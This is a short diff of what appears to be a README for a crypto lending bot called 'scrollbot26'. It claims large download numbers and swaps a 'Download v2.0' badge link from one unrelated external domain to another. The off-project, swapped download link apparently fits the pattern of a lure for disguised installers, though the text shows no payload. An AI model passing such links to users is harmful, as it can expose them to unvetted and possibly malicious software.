@@ -49,7 +49,7 @@ A: Yes — auto-deposit and withdraw on lending protocols.
 
 **Monthly downloads:** 1.5m+
 
-[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/scrollbot26)
+[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/scrollbot26)
 
 ---
 
